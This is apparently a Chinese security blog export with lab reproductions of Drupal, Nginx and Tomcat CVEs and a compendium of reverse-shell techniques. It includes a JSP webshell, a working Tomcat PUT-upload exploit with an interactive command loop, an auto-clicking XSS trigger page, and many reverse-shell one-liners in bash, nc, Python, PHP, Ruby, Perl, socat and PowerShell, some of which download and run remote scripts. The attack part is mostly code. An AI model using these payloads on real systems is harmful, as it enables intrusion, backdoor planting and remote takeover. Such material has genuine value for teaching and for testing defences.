System，简称CMS）。它是用PHP编程语言开发的，并使用MySQL或PostgreSQL数据库进入数据存储。Drupal提供了一套功能强大和灵活的工具，用于构建和管理网站、博客、社区网站、电子商务平台和其他各种在线应用。Drupal提供了许许多多的功能和模块，使用用户足够的创建和管理各种类型的内容，包括文章、页面、图像、多媒体文件和用户帐户。它还具有强大的用户角色和权限管理系统，使网站管理人员足够对不同的用户给予不同的访问权限。Drupal的主要优点之一是其灵性和可扩展性。它拥有一个很大的社区，提供了数以千计的模块和主题，可以根据不同的需求和要求进行定制。这使Drupal成为一个非常强大的和适合性能强的平台，可以用于构建各种模板和类型的网站。总的来说，Drupal是一种功能强大、灵魂活动和可扩展的开源内部管理系统，用于构建和管理各种类型的网站和在线应用。何为内容管理系统(CMS):内容管理系统（Content Management System，CMS）可以用来管理、组织和发布各种类型的内容。它提供了一套工具和功能，使用户能够轻松创建、编辑、存储和分发内容，而无需编写代码或具备深入的技术知识。\n0x04-漏洞原理\n3.1 无后缀文件写入\n在Drupal的机制中，设定了这样一条规则。\n用户上传的图片文件名将会被保留，如果出现文件名相同的情况，那么文件名后面就会被跟上_0,_1依次递增。\n在Drupal中为了兼容各种编码，在处理上传文件名时，Drupal会对文件名对相应的处理，如果出现值小于0x20的字符，那么就会将其转化为_。\n![image-20230615205051359](Drupal XSS漏洞（CVE-2019-6341）\\image-20230615205051359.png)\n但如果文件名中，如果出现了\\x80到\\xff的字符时，PHP就会抛出PREG_BAD_UTF8_ERROR，如果发生错误，那么preg_replace就会返回NULL，$basename就会被置为NULL。\n![image-20230615205106915](Drupal XSS漏洞（CVE-2019-6341）\\image-20230615205106915.png)\n当basename为空时，后面的文件内容会被写入到形似_0的文件内\n![image-20230615205120047](Drupal XSS漏洞（CVE-2019-6341）\\image-20230615205120047.png)\n在这个基础下，原本会被上传到\n/sites/default/files/pictures/&lt;YYYY-MM&gt;/\n则会被写入\n/sites/default/files/pictures/&lt;YYYY-MM&gt;/_0\n当服务端开启了评论头像上传，或者是拥有作者账号时\n攻击者可以通过上传一张恶意构造的gif图，然后再上传一张带有恶意字符的同一张图，那么就会将恶意图片的内容写入到相应目录的_0中\n![image-20230615210437063](Drupal XSS漏洞（CVE-2019-6341）\\image-20230615210437063.png)\n但如果我们直接访问这个文件时，该文件可能不会解析，这是因为\n\n浏览器首先会根据服务端给出的content-type解析页面，而服务端一般不会给空后缀的文件设置content-type，或者设置为application/octet-stream\n其次浏览器会根据文件内容做简单的判断，如果文件的开头为&lt;html&gt;，则部分浏览器会将其解析为html\n部分浏览器还可能会设置默认的content-type，但大部分浏览器会选择不解析该文件。\n\n这时候我们就需要一个很特殊的小trick了，a标签可以设置打开文件的type(only not for chrome)\n当你访问该页面时，页面会被解析为html并执行相应的代码。\n&lt;html&gt;&lt;head&gt;&lt;/head&gt;  &lt;body&gt;  &lt;a id=&#x27;a&#x27; href=&quot;http://127.0.0.1/drupal-8.6.2/sites/default/files/2019-04/_6&quot; type=&quot;text/html&quot;&gt;321321&lt;/a&gt;  &lt;script type=&quot;text/javascript&quot;&gt;    var a  = document.getElementById(&#x27;a&#x27;)    a.click()  &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;\n当被攻击者访问该页面时，我们就可以执行任意的xss，这为后续的利用带来了很大的便利，我们有了一个同源环境下的任意js执行点，让我们继续看。\n0x05-漏洞复现\n该漏洞需要利用drupal文件模块上传文件的漏洞，伪造一个图片文件，上传，文件的内容实际是一段HTML代码，内嵌JS，这样其他用户在访问这个链接时，就可能触发XSS漏洞。\nDrupal 的图片默认存储位置为 /sites/default/files/pictures/&lt;YYYY-MM&gt;/，默认存储名称为其原来的名称，所以之后在利用漏洞时，可以知道上传后的图片的具体位置。\n使用PoC上传构造好的伪造GIF文件，PoC参考thezdi/PoC的PoC。\n如图，输入如下命令，即可使用PoC构造样本并完成上传功能，第一个参数为目标IP 第二个参数为目标端口。\n![image-20230615212825825](Drupal XSS漏洞（CVE-2019-6341）\\image-20230615212825825.png)\n上传成功后，访问图片位置，即可触发 XSS 漏洞，如下图所示。\n尖端：\n\n因为 Chrome 和 FireFox 浏览器自带部分过滤 XSS 功能，所以验证存在时可使用 Edge 浏览器或者 IE 浏览器。\n访问的图片名称为_0的原因是因为 Drupal 的规则机制，具体原理见Drupal 1-click to RCE 分析\n\n/var/www/html/drupal/sites/default/files/pictures/YYYY-MM\n这里的时间应该是你上传的时候的北京时间因此我这里的访问路径为\nhttp://185.243.241.45:8080/sites/default/files/pictures/2023-06/_0\n![image-20230615213558660](Drupal XSS漏洞（CVE-2019-6341）\\image-20230615213558660.png)\n但不知为何我这里edge浏览器也不显示弹窗\n","categories":["CVE漏洞"],"tags":["CVE"]},{"title":"Nginx-文件名逻辑漏洞CVE-2013-4547","url":"/2023/09/16/Nginx-%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/","content":"0x01 漏洞描述：\n这个漏洞其实和代码执行没有太大的关系,主要原因是错误地解析了请求的URL,错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。\n影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7\n0x02 漏洞原理：\n举个例子,比如,nginx匹配到.php结尾的请求,就发送给fastcgi进行解析,常见的写法如下:\nlocation ~ \\.php$ &#123;    include        fastcgi_params;    fastcgi_pass   127.0.0.1:9000;    fastcgi_index  index.php;    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;    fastcgi_param  DOCUMENT_ROOT /var/www/html;&#125;\n正常情况下(关闭了pathinfo的情况下),只有.php后缀的文件才会被发送给fastcgi解析。\n而存在CVE-2013-4547的情况下,我们请求1.gif[0x20][0x00].php，这个URI可以匹配上正则.php$,可以进入这个Location块；但进入后,Nginx却错误地认为请求的文件是1.gif[0x20],就设置其为SCRIPT_FILENAME的值发送给fastcgi。\nFastcgi根据SCRIPT_FILENAME的值进行解析,最后造成了解析漏洞。\n所以,我们只需要上传一个空格结尾的文件,即可使PHP解析之。\n再举个例子,比如很多网站限制了允许访问后台的IP:\nlocation /admin/ &#123;    allow 127.0.0.1;    deny all;&#125;\n我们可以请求如下URI:/test[0x20]/…/admin/index.php,这个URI不会匹配上location后面的/admin/,也就绕过了其中的IP验证;但最后请求的是/test[0x20]/…/admin/index.php文件,也就是/admin/index.php,成功访问到后台。(这个前提是需要有一个目录test:这是Linux系统的特点,如果有一个不存在的目录,则即使跳转到上一层,也会爆文件不存在的错误,Windows下没有这个限制)\n0x03 复现过程\n在Windows弄了个环境，后来发现要文件名的后面存在空格，而Windows是不允许存在此类文件的，因此这里复现，使用Vulhub的docker进行复现。\n访问http://your-ip:8080/ 上传文件\n看一下后端过滤\n\n简单明了的黑名单\n访问http://your-ip:8080/ 上传文件，在jpg后面加个空格，是的上传的文件名叫做1.jpg[空格]\n\n访问http://your-ip:8080/uploadfiles/1.jpg .php, 并抓包，修改为1.jpg...php, 在Hex选修卡中将jpg后面的两个点2e改成20,00\n点击Go,如下。\n\n注意，[0x20]是空格，[0x00]是\\0，这两个字符都不需要编码。\nNote:该漏洞不受cgi.fix_pathinfo影响，当其为0时，依旧解析，在Windows上有所限制。\n0x04 修复建议\n1）设置security.limit_extensions = .php\n2）或升级Nginx\n","categories":["CVE漏洞"],"tags":["CVE"]},{"title":"Tomcat 远程代码执行CVE-2019-0232","url":"/2023/09/16/Tomcat%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","content":"0x01 漏洞描述：\n2019年4月11日，Apache官方发布通告称将在最新版本中修复一个远程代码执行漏洞（CVE-2019-0232），由于JRE将命令行参数传递给Windows的方式存在错误，会导致CGI Servlet受到远程执行代码的攻击。触发该漏洞需要同时满足以下条件：1. 系统为Windows2. 启用了CGI Servlet（默认为关闭）3. 启用了enableCmdLineArguments（Tomcat 9.0.*及官方未来发布版本默认为关闭）影响范围Apache Tomcat 9.0.0.M1 to 9.0.17Apache Tomcat 8.5.0 to 8.5.39Apache Tomcat 7.0.0 to 7.0.93\n0x02 漏洞复现：\n我的复现环境：\nwindows server 2008 R2apache Tomcat 8.5.23jdk 1.8\njdk可以去官网下载，tomcat下载地址：https://archive.apache.org/dist/tomcat/  （最好下载bin目录里的文件）\n然后就是配置java环境变量，参考https://www.runoob.com/java/java-environment-setup.html\n解压配置tomcat，运行startup.bat,如果这里不能正确弹出命令行窗口显示服务器已运行，可能是java环境变量配置有问题，也可以在startup.bat最后加一个pause让命令行在最后不关闭，看一下是否有报错信息\n![image-20230723163651288](Tomcat 远程代码执行\\image-20230723163651288.png)\n配置好之后，需要修改一些tomcat的配置：\n1）conf/web.xml 中启用CGIServlet和启用cgi的servlet-mapping\n注意这里可能有些版本里的cgiPathPrefix的值是WEB-INF/cgi，需要改一下为我们后面创建的WEB-INF/cgi-bin\n&lt;servlet&gt;    &lt;servlet-name&gt;cgi&lt;/servlet-name&gt;    &lt;servlet-class&gt;org.apache.catalina.servlets.CGIServlet&lt;/servlet-class&gt;    &lt;init-param&gt;      &lt;param-name&gt;cgiPathPrefix&lt;/param-name&gt;      &lt;param-value&gt;WEB-INF/cgi-bin&lt;/param-value&gt;    &lt;/init-param&gt;    &lt;init-param&gt;      &lt;param-name&gt;enableCmdLineArguments&lt;/param-name&gt;      &lt;param-value&gt;true&lt;/param-value&gt;    &lt;/init-param&gt;    &lt;init-param&gt;      &lt;param-name&gt;executable&lt;/param-name&gt;      &lt;param-value&gt;&lt;/param-value&gt;    &lt;/init-param&gt;    &lt;load-on-startup&gt;5&lt;/load-on-startup&gt;&lt;/servlet&gt;#将下面的语句的注释去掉&lt;servlet-mapping&gt;    &lt;servlet-name&gt;cgi&lt;/servlet-name&gt;    &lt;url-pattern&gt;/cgi-bin/*&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;\n2）然后修改在conf/context.xml中的添加privileged=&quot;true&quot;语句\n![image-20230723165728781](Tomcat 远程代码执行\\image-20230723165728781.png)\n3）然后在 ROOT\\WEB-INF 下创建 cgi-bin 目录, 并在该目录下创建一个内容为 echo Content-type: text/html 的 .bat 文件。\nCopy例：hello.bat@echo offecho Content-Type: text/plainecho.set foo=%~1%foo%\n![image-20230723165809873](Tomcat 远程代码执行\\image-20230723165809873.png)\n成功访问\n漏洞利用\n访问http://127.0.0.1:8080/cgi-bin/lxhsec.bat?&amp;dir\n![image-20230723172844447](Tomcat 远程代码执行\\image-20230723172844447.png)\n执行命令http://127.0.0.1:8080/cgi-bin/lxhsec.bat?&amp;C:/WINDOWS/system32/net+user\n![image-20230723172916863](Tomcat 远程代码执行\\image-20230723172916863.png)\n2.把后面的命令修改成calc.exe弹出计算器：http://localhost:8080/cgi-bin/hello.bat?&amp;C%3A\\Windows\\System32\\calc.exe\n![image-20230723172951240](Tomcat 远程代码执行\\image-20230723172951240.png)\n漏洞原理具体分析\n参考：https://xz.aliyun.com/t/4875\nNote:net命令的路径要写全，直接写net user，Tomcat控制台会提示net不是内部命令，也不是可运行的程序，另 必须使用+号连接，使用空格，%2B都会执行失败，控制台报错。\n0x03 修复建议\n这个默认是关闭的，如果打开了请关闭，若需使用请升级版本。\n","categories":["CVE漏洞"],"tags":["CVE"]},{"title":"Tomcat-任意文件写入CVE-2017-12615","url":"/2023/09/16/Tomcat-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/","content":"0x01 漏洞描述：\nCVE-2017-12615：远程代码执行漏洞\n影响范围：Apache Tomcat 7.0.0 - 7.0.79 (windows环境)\n当 Tomcat 运行在 Windows 操作系统时，且启用了 HTTP PUT 请求方法（例如，将 readonly  初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP  文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。\n0x02 复现过程：\n开启环境后进入配置文件查看一下\n#查看镜像docker ps#进入镜像环境docker exec -ti 03de30c386ea bas#查看配置文件conf/web.xml中readonly的设置cat conf/web.xml | grep readonly\n\n查看网站\nhttp://your-ip:8080/\n\n方法一：\n使用burpsuite抓包，修改GET为PUT上传方式，添加文件名1.jsp/，添加shell脚本\n&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;\n\n成功上传\n\n使用冰蝎访问\n\n这里不知为何，我的冰蝎死活连接不上\n方法二(适用于Windows系统)\n添加文件名2.jsp%20，添加shell脚本\n方法三(适用于Windows系统)\n添加文件名3.jsp::$DATA，添加shell脚本\n0x03 POC和EXP脚本\n\nPOC代码\n#CVE-2017-12615 POC__author__ = &#x27;纸机&#x27;import requestsimport optparseimport osparse = optparse.OptionParser(usage = &#x27;python3 %prog [-h] [-u URL] [-p PORT] [-f FILE]&#x27;)parse.add_option(&#x27;-u&#x27;,&#x27;--url&#x27;,dest=&#x27;URL&#x27;,help=&#x27;target url&#x27;)parse.add_option(&#x27;-p&#x27;,&#x27;--port&#x27;,dest=&#x27;PORT&#x27;,help=&#x27;target port[default:8080]&#x27;,default=&#x27;8080&#x27;)parse.add_option(&#x27;-f&#x27;,dest=&#x27;FILE&#x27;,help=&#x27;target list&#x27;)options,args = parse.parse_args()#print(options)#验证参数是否完整if (not options.URL or not options.PORT) and not options.FILE:        print(&#x27;Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port] [-f FILE]\\n&#x27;)        exit(&#x27;CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help&#x27;)filename = &#x27;/hello.jsp&#x27;#测试数据data = &#x27;hello&#x27;#提交PUT请求#resp = requests.post(url1,headers=headers,data=data)#验证文件是否上传成功#response = requests.get(url2)#上传文件def upload(url):  try:    response = requests.put(url+filename+&#x27;/&#x27;,data=data)    return 1  except Exception as e:    print(&quot;[-] &#123;0&#125; 连接失败&quot;.format(url))    return 0def checking(url):  try:    #验证文件是否上传成功    response = requests.get(url+filename)    #print(url+filename)    if response.status_code == 200 and &#x27;hello&#x27; in response.text:      print(&#x27;[+] &#123;0&#125; 存在CVE-2017-12615 Tomcat 任意文件读写漏洞&#x27;.format(url))    else:      print(&#x27;[-] &#123;0&#125; 不存在CVE-2017-12615 Tomcat 任意文件读写漏洞&#x27;.format(url))  except Exception as e:                #print(e)    print(&quot;[-] &#123;0&#125; 连接失败&quot;.format(url))if options.FILE and os.path.exists(options.FILE):  with open(options.FILE) as f:    urls = f.readlines()    #print(urls)    for url in urls:      url = str(url).replace(&#x27;\\n&#x27;, &#x27;&#x27;).replace(&#x27;\\r&#x27;, &#x27;&#x27;).strip()      if upload(url) == 1:        checking(url)elif options.FILE and not os.path.exists(options.FILE):  print(&#x27;[-] &#123;0&#125; 文件不存在&#x27;.format(options.FILE))else:  #上传链接  url = options.URL+&#x27;:&#x27;+options.PORT  if upload(url) == 1:    checking(url)\n测试\npython3 CVE-2017-15715-POC.py -u http://192.168.132.144 -p8080\n\npython3 CVE_2017_12615.py -f IP.txt\n\nEXP代码\n#CVE-2017-12615 EXP__author__ = &#x27;纸机&#x27;import requestsimport optparseimport timeparse = optparse.OptionParser(usage = &#x27;python3 %prog [-h] [-u URL] [-p PORT]&#x27;)parse.add_option(&#x27;-u&#x27;,&#x27;--url&#x27;,dest=&#x27;URL&#x27;,help=&#x27;target url&#x27;)parse.add_option(&#x27;-p&#x27;,&#x27;--port&#x27;,dest=&#x27;PORT&#x27;,help=&#x27;target port[default:8080]&#x27;,default=&#x27;8080&#x27;)options,args = parse.parse_args()#验证参数是否完整if not options.URL or not options.PORT:        print(&#x27;Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port]\\n&#x27;)        exit(&#x27;CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help&#x27;)url = options.URL+&#x27;:&#x27;+options.PORTfilename = &#x27;/backdoor.jsp&#x27;payload = filename+&#x27;?pwd=023&amp;i=&#x27;headers = &#123;&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0&quot;&#125;#木马data = &#x27;&#x27;&#x27;&lt;%    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();        int a = -1;        byte[] b = new byte[2048];        out.print(&quot;&lt;pre&gt;&quot;);        while((a=in.read(b))!=-1)&#123;            out.println(new String(b));        &#125;        out.print(&quot;&lt;/pre&gt;&quot;);    &#125;%&gt;&#x27;&#x27;&#x27;#上传木马文件def upload(url):  print(&#x27;[*] 目标地址:&#x27;+url)  try:    respond = requests.put(url+filename+&#x27;/&#x27;,headers=headers,data = data)    #print(respond.status_code)    if respond.status_code == 201 or respond.status_code == 204:      #print(&#x27;[*] 目标地址:&#x27;+url)      print(&#x27;[+] 木马上传成功&#x27;)  except Exception as e:    print(&#x27;[-] 上传失败&#x27;)    return 0#命令执行def attack(url,cmd):  try:    respond = requests.get(url+payload+cmd)    if respond.status_code == 200:      print(str(respond.text).replace(&quot;&lt;pre&gt;&quot;,&quot;&quot;).replace(&quot;&lt;/pre&gt;&quot;,&quot;&quot;).strip())  except Exception as e:    print(&#x27;[-] 命令执行错误&#x27;)if upload(url) == 0:        exit()time.sleep(0.5)print(&#x27;输入执行命令(quit退出):&#x27;)while(1):  cmd = input(&#x27;&gt;&gt;&gt;&#x27;)  if(cmd == &#x27;quit&#x27;):    break  attack(url,cmd)\n测试\npython3 CVE-2017-12615-EXP.py -u http://192.168.132.144 -p 35654\n\n0x04 修复建议\n\n\n设置conf/webxml 文件的 readOnly 值为 Ture 或注释参数\n禁用 PUT 方法并重启 tomcat 服务（如果禁用 PUT 方法，对于依赖PUT方法的应用，可能导致业务失效。）\n升级到最新版本\n使用WAF产品进行防御\n\n参考文章\nhttps://blog.csdn.net/weixin_45540609/article/details/119170419\nhttps://www.cnblogs.com/rnss/p/13384127.html\nhttps://paper.seebug.org/399/\n","categories":["CVE漏洞"],"tags":["CVE"]},{"title":"反弹shell的方法总结","url":"/2023/09/17/%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/","content":"一、前言\n1. 什么是反弹shell\n就是控制端监听某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。\n假设有两台主机A(控制端)B(被控端)正向shell，就是ssh、Telnet的连接，A主动发起连接B指定端口，然后A就可以通过命令控制B了反弹shell，A先开启一个监听端口，让B去连接A的这个端口，连接成功后，A就能控制B了\n2. 为什么需要反弹shell？\n反弹shell通常用于被控端因防火墙受限、权限不足、端口被占用等情形。在渗透过程中，往往因为端口限制而无法直连目标机器，此时需要通过反弹shell来获取一个交互式shell，以便继续深入。以下详细介绍Windows和Linux系统下反弹shell的几种方式。\n二、反弹shell命令解析\n1. 命令解析\n例如：bash -i &gt;&amp; /dev/tcp/192.168.1.1/9090 0&gt;&amp;1\nbash -i\nbash -i，意为创建一个交互式的bash shell\n\n/dev/tcp/192.168.1.1/9090\ndev是设备(device)的英文缩写。这里主要存放与设备（包括外设）有关的文件\n\n/dev/tcp/是linux中的一个特殊设备，打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，linux中还存在/dev/upd/\n\n所以上述命令是和192.168.1.1:9090建立TCP连接\n\n虽然/dev/tcp/$&#123;HOST&#125;/$&#123;PORT&#125;这个字符虽然看起来像一个文件系统中的文件，并且位于/dev这个设备文件夹下\n但是这个文件并不存在，并且不是一个设备文件。这只是bash实现的用来实现网络请求的一个接口，其实就像我们自己编写的一个命令行程序，按照指定的格式输入host port参数，就能发起一个socket连接\n2. 文件描述符\nLinux系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件\n所有执行I/O操作的系统调用都会通过文件描述符，即文件描述符可控制输入输出（输出/输出重定向）\n\n\n\n\n\n\n\n\n\n\n\n标准输入(stdin)\n代码为0\n使用&lt;或&lt;&lt;\n默认设备键盘\n\n\n标准输出(stdout)\n代码为1\n使用&gt;或&gt;&gt;\n默认设备显示器\n\n\n标准错误输出(stderr)\n代码为2\n使用2&gt;或2&gt;&gt;\n默认设备显示器\n\n\n\n大多数Linux系统命令从你的终端接受输入并将所产生的输出发送回到您的终端。一个命令通常从一个叫标准输入的地方读取输入，默认情况下，这恰好是你的终端。同样，一个命令通常将其输入写入到标准输出，默认情况下，这也是你的终端。\nshell 输入/输出重定向\n如上，我们正常使用终端执行命令时，默认输入输出皆是终端。\n3. 输出重定向\n顾名思义，就是将输出结果重定向到其他地方\n1️⃣\n使用 1&gt; 将输出结果写入到指定文件中，文件不存在则创建文件，文件如果存在会覆盖原文件内容\n1&gt; 中的1是默认的可以忽略不写，也就是可以写成&gt;\n同理0&lt;可以写成&lt;\n2️⃣\n使用&gt;&gt;会追加内容在文件末尾\n3️⃣实例\n控制端：kali\n被控端：centos\nkali监听8888端口\ncentos输入命令\necho hello &gt; /dev/tcp/192.168.17.128/8888\nkali监听到输出结果\n\n4. 输入重定向\nkali继续监听端口，centos输入命令\nbash -i &gt; /dev/tcp/192.168.17.128/8888\nkali得到输出结果\n\n\n这种方法的话，centos输一条命令，kali则回显一条命令输出结果\n输入输出结合获得shell\n两条命令\nbash -i &gt; /dev/tcp/192.168.17.128/8888\nbash -i &lt; /dev/tcp/192.168.17.128/8888\n结合一下，即可实现反弹shell\nbash -i &gt;&amp; /dev/tcp/192.168.17.128/8888 0&gt;&amp;1\n1️⃣\n0&gt;&amp;1\n语法格式是\n&gt;&amp;word\n\n当word为数字或者-时，表示复制文件描述符\n复制格式有num1&lt;&amp;num2和num1&gt;&amp;num2，区别是，前者是以只读的形式打开，后者是以写的形式打开，这里两者均可\n0&gt;&amp;1这里意思是将0[标准输入]重定向到了1[标准输出]指向的位置\n2️⃣\n&gt;&amp;\n当word不是数字或-字符时，&gt;&amp;表示将标准错误输出合并到标准输出中\n三、linux下反弹shell\n实验环境：\nWin10 192.168.17.135 NC监听\nKali 192.168.17.128 自带工具\n1. bash反弹\nbash -i &gt;&amp; /dev/tcp/192.168.17.135/7777 0&gt;&amp;1\n这里也是崩溃了，第一种反弹方法就遇到了障碍，我发现我的kali用不了上述的方法，它表明/dev/tcp文件不存在，网上漫游发现\nlinux中有一个特殊的文件/dev/tcp,打开这个文件就类似于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。但是/dev/tcp本身是不存在的，无法在/dev下看到这个设备节点。而在bash中通过打开/dev/tcp来取得socket的功能实际上是bash的特性，并不是系统的功能。\n于是有些版本的bash可能默认不支持对/dev/tcp的打开。此时可以在编译bash的时候增加一个参数：–enable-net-redirections然后重新编译bash即可。\n但我没有增加参数，因为我当时认为我bash版本应该很高，已经默认开启了这个选项 ，于是我跟着文章查看了当前shell环境，发现为zsh，于是我新建了一个用户用于永久使用bash命令。参考文章在下面\n\n\n但有强迫症的我，接着根据几个关键词搜寻linux下如何切换shell环境，终于找到了永久切换文章，这里也放到下面，也很简单，就几条命令而已\n在特殊情况可以使用base64编码执行bash反弹shell\nbash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3LjEzNS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;\n\n\n在kali中执行会解析成编码前的bash命令\n2. nc反弹\nnc -e /bin/bash 192.168.17.135 8888\n-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(/bin/bash)，也就是反弹一个shell给远程，可以看到远程已经成功反弹到了shell，并且可以执行命令。\n\n\n3. curl反弹\nKali开启apache服务，把bash命令写入html文件，只要文本包含bash一句话即可。\n开启apache可参考：Kali Linxu中打开Apache服务\ncurl 192.168.17.137/bash.html|bash    //当前kali地址\n\n\n4. whois反弹\nwhois -h 192.168.17.135 -p 4444 `pwd` //反弹的shell只能执行后面带的命令\n\n\n5. python反弹\npython -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.17.135&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;\n\n\n6. PHP反弹\nphp反弹shell和python的方式差不多\nphp -r &#x27;$sock=fsockopen(&quot;192.168.17.135&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;\n\n\n7. ruby反弹\nruby -rsocket -e&#x27;f=TCPSocket.open(&quot;192.168.17.135&quot;,8888).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;\n但这个语句似乎不能用了吧，报了如下错误\n\n搜寻发现下列语句\nruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;192.168.17.135&quot;,&quot;8888&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;\n\n\nruby -rsocket -e &#x27;c=TCPSocket.new(&quot;192.168.17.135&quot;,&quot;8888&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;\n\n\n这两种方法均可\n8. socat反弹\nsocat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.17.135:8888\n\n\n但是乱码真的烦，我也没细究为何\n9. Perl反弹\nperl -e &#x27;use Socket;$i=&quot;192.168.17.135&quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;\n\n\n四、Windows下反弹shell\n1. powercat反弹\n用IEX下载远程PS1脚本回来权限绕过执行\n使用powershell执行IEX\npowershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://github.com/besimorhino/powercat/blob/master/powercat.ps1&#x27;);powercat -c 192.168.17.137 -p 8888 -e cmd\n这里我也很头疼一直不成功，我感觉从网上下载绕过肯定可行，但似乎失误率很高，毕竟目标文件的格式很容易犯错，当然或许可以下载到本地或vps，通过局域网或者公网访问下载。这里我选择直接下载使用看看\npowercat下载地址：https://github.com/besimorhino/powercat //下载到本地执行\npowercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat\n#导入模块Import-Module .\\powercat.ps1#如果提示未能加载指定模块，则可能是权限问题，以管理员权限运行powershell，然后输入如下代码Set-ExecutionPolicy Unrestricted#输入如下命令可以查看帮助信息powercat -h\n输入powercat -c 192.168.17.137 -p 8888 -e cmd\n\n\n2. NC反弹\n服务端反弹：nc 192.168.17.137 8888 -e c:\\windows\\system32\\cmd.exe\n\n\n3. nishang反弹\nNishang下载地址：https://github.com/samratashok/nishang\nNishang是一个基于PowerShell的攻击框架，整合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell\n将nishang下载到攻击者本地，在目标机使用powershell执行以下命令\npowershell IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.17.1/tools/nishang-master/Shells/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.17.137 -port 8888\n这里依旧不行，或许访问本地下载速度很慢，等了几分钟我也没见结果，因此还是直接下载到目标机执行吧。。。。\nImport-Module .\\Invoke-PowerShellTcp.ps1 //导入模块#如果提示未能加载指定模块，则可能是权限问题，以管理员权限运行powershell，然后输入如下代码Set-ExecutionPolicy UnrestrictedInvoke-PowerShellTcp -Reverse -IPAddress 192.168.17.137 -port 8888\n\n\n这个脚本linux、windows命令均可以使用\n4. Reverse UDP shell\n攻击机监听 nc -lvup 8888\n利用上面下载的还是放在攻击机上在目标机中powershell执行以下命令\nImport-Module .\\Invoke-PowerShellUdp.ps1Invoke-PowerShellUdp -Reverse -IPAddress 192.168.17.137 -port 8888\n\n\n这里我一直没通，以为是什么别的问题，看来还是浅薄了，这里的监听命令必须为nc -lvup port，我这里一直是vnp，查询了一番发现\n-u：指定nc使用UDP协议，默认为TCP\n参考：nc命令用法举例\n5. MSF反弹\n我们直接可以使用 msfvenom -l 结合关键字过滤（如cmd/windows/reverse），找出我们需要的各类反弹一句话payload的路径信息。\nmsfvenom -l payloads | grep &#x27;cmd/windows/reverse&#x27;\n\n这里找powershell的payload\n依照前面查找出的命令生成一句话payload路径，我们使用如下的命令生成反弹一句话，然后复制粘贴到靶机上运行即可。\nmsfvenom 